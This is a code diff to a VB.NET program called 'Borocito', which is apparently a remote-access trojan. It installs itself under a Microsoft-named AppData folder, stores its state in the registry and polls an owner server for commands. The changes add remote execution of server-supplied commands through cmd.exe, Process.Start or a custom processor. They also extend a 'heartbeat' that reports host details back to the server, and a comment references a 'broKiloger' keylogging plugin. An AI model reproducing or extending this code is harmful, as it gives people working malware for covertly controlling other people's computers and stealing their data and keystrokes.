@@ -9,7 +9,10 @@ Module GlobalUses
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
     Public HttpOwnerServer As String
-End Module
+    Public compileVersion As String = My.Application.Info.Version.ToString &
+        " (" & Application.ProductVersion & ") " &
+        "[17/05/2022 00:11]" 'Indicacion exacta de la ultima compilacion
+End Module '<--- ACTUALIZAR DATOS
 Module Utility
     Public tlmContent As String
     Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
@@ -67,10 +70,12 @@ Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
     Public OwnerServer As String
     Public UID As String
+    Public MyCommandProcessor As String
     Sub SaveRegedit()
         Try
             AddToLog("SaveRegedit@Memory", "Saving data...", False)
             regKey.SetValue("UID", UID, RegistryValueKind.String)
+            regKey.SetValue("MyCommandProcessor", MyCommandProcessor, RegistryValueKind.String)
             LoadRegedit()
         Catch ex As Exception
             AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
@@ -81,6 +86,7 @@ Module Memory
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
             OwnerServer = regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
+            MyCommandProcessor = regKey.GetValue("MyCommandProcessor")
             HttpOwnerServer = "http://" & OwnerServer
         Catch ex As Exception
             AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
@@ -245,6 +251,7 @@ Module Network
     Dim IsConfigReaderThreadRunning As Boolean = False
     Dim PersistentProccessed As Boolean = False
     Dim PersistentCommand As String = Nothing
+    Dim cmdSetType As SByte = 0
     Dim ThreadReadCMDServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadCommandFile))
     Dim ThreadReadGeneralConfigServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadConfigFile))
     Sub ReportMeToServer()
@@ -479,6 +486,7 @@ Module Network
                 Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Comando principal
                 Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
                 Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
+                Dim PersistentesCMD() As String = CMD3.Split("|")
                 PersistentCommand = CMD3
 
                 'Las respuestas generadas por cada comando deben ser concatenadas con la respuesta del anterior, luego de eso, debe ser enviada.
@@ -510,7 +518,9 @@ Module Network
 
                 If Not PersistentProccessed Then 'Solo procesa por instancia (una vez)
                     If CMD3 <> Nothing Then
-                        CommandResponse &= vbCrLf & ProccessCommand(CMD3)
+                        For Each comando As String In PersistentesCMD
+                            CommandResponse &= vbCrLf & ProccessCommand(comando)
+                        Next
                         If CMD3 = Nothing Then
                         Else
                             If CommandResponse = Nothing Then
@@ -519,8 +529,8 @@ Module Network
                                 SendCommandResponse(CommandResponse)
                             End If
                         End If
+                        PersistentProccessed = True
                     End If
-                    PersistentProccessed = True
                 End If
             Catch ex As Exception
                 AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
@@ -632,10 +642,11 @@ Module Network
                 AddToLog("Network", "Borocito has been called to restart!", True)
                 SendTelemetry()
                 Restart()
+                Return "Borocito has been called to restart!"
 
             ElseIf command.StartsWith("/Uninstall") Then 'Funciona.
-                SendCommandResponse("Borocito has been called to uninstall!")
-                AddToLog("Network", "Borocito has been called to uninstall!", True)
+                SendCommandResponse("Borocito has been called to uninstall. Goodbye")
+                AddToLog("Network", "Borocito has been called to uninstall. Goodbye!", True)
                 SendTelemetry()
                 Uninstall()
 
@@ -644,12 +655,14 @@ Module Network
                 AddToLog("Network", "Borocito has been called to Update!", True)
                 SendTelemetry()
                 Update()
+                Return "Borocito has been called to Update!"
 
             ElseIf command.StartsWith("/ForceUpdate") Then 'Funciona.
                 SendCommandResponse("Borocito has been called to Force the Update")
                 AddToLog("Network", "Borocito has been called to Force the Update!", True)
                 SendTelemetry()
                 Update("/ForceUpdate")
+                Return "Borocito has been called to Force the Update!"
 
             ElseIf command.StartsWith("/Reset") Then 'Funciona.
                 SendCommandResponse("Borocito has been called to Reset")
@@ -663,7 +676,28 @@ Module Network
                 SendTelemetry()
 
             ElseIf command.StartsWith("/Heartbeat") Then 'Funciona.
-                Return "---/\--- (Pum pum...)"
+                Return "---/\--- (Pum pum...)" &
+                    vbCrLf & "[VARIABLES]" &
+                    vbCrLf & compileVersion &
+                    vbCrLf & "DIRCommons: " & DIRCommons &
+                    vbCrLf & "DIRTemp: " & DIRTemp &
+                    vbCrLf & "parameters: " & parameters &
+                    vbCrLf & "HttpOwnerServer: " & HttpOwnerServer &
+                    vbCrLf & "OwnerServer: " & OwnerServer &
+                    vbCrLf & "UID: " & UID &
+                    vbCrLf & "MyCommandProcessor: " & MyCommandProcessor &
+                    vbCrLf & "IsrefreshTelemetryThreadRunning: " & IsrefreshTelemetryThreadRunning &
+                    vbCrLf & "IsCommandReaderThreadRunning: " & IsCommandReaderThreadRunning &
+                    vbCrLf & "IsConfigReaderThreadRunning: " & IsConfigReaderThreadRunning &
+                    vbCrLf & "PersistentProccessed: " & PersistentProccessed &
+                    vbCrLf & "PersistentCommand: " & PersistentCommand &
+                    vbCrLf & "cmdSetType: " & cmdSetType &
+                    vbCrLf & "[COMPUTER]" &
+                    vbCrLf & "UserDomainName: " & Environment.UserDomainName &
+                    vbCrLf & "RAM: " & My.Computer.Info.AvailablePhysicalMemory & "/" &
+                    My.Computer.Info.AvailableVirtualMemory & "/" &
+                    My.Computer.Info.TotalPhysicalMemory & "/" &
+                    My.Computer.Info.TotalVirtualMemory
                 AddToLog("Network", "Hey, Im here!", True)
 
             ElseIf command.StartsWith("/Status") Then 'Funciona.
@@ -672,6 +706,45 @@ Module Network
             ElseIf command.StartsWith("boro-get") Then 'Funciona.
                 Return BORO_GET_ADMIN(command)
 
+            ElseIf command.ToLower = "<set cmd default" Then
+                cmdSetType = 0
+                Return "Default command processor changed to 'default'"
+            ElseIf command.ToLower = "<set cmd cmd" Then
+                cmdSetType = 1
+                Return "Default command processor changed to 'Console'"
+            ElseIf command.ToLower = "<set cmd process" Then
+                cmdSetType = 2
+                Return "Default command processor changed to 'Process'"
+            ElseIf command.ToLower = "<set cmd boro-get" Then
+                cmdSetType = 3
+                Return "Default command processor changed to 'boro-get'"
+            ElseIf command.ToLower Like "*<set cmd own*" Then
+                Dim args() As String = command.Split(" ")
+                MyCommandProcessor = args(3)
+                cmdSetType = 4
+                Return "Default command processor changed to 'own' in '" & MyCommandProcessor & "'"
+            Else
+                If cmdSetType = 1 Then
+                    Process.Start("cmd.exe", command)
+                    Return "Starting cmd under '" & command & "' argument..."
+                ElseIf cmdSetType = 2 Then
+                    Process.Start(command)
+                    Return "Starting '" & command & "'..."
+                ElseIf cmdSetType = 3 Then
+                    'Se espera que el usuario escriba
+                    '   broKiloger /startrecording
+                    'y no
+                    '   broKiloger True /startrecording
+                    'True se da por True.
+                    Dim args() As String = command.Split(" ")
+                    Dim comandoAux As String = Nothing
+                    For i As Integer = 1 To args.Count - 1
+                        comandoAux &= " " & args(i)
+                    Next
+                    Return BORO_GET_ADMIN(args(0) & " True " & comandoAux.TrimStart())
+                ElseIf cmdSetType = 4 Then
+                    Return AnotherCommandProcessor(command)
+                End If
             End If
         Catch ex As Exception
             AddToLog("ProccessCommand@Network", "Error: " & ex.Message, True)
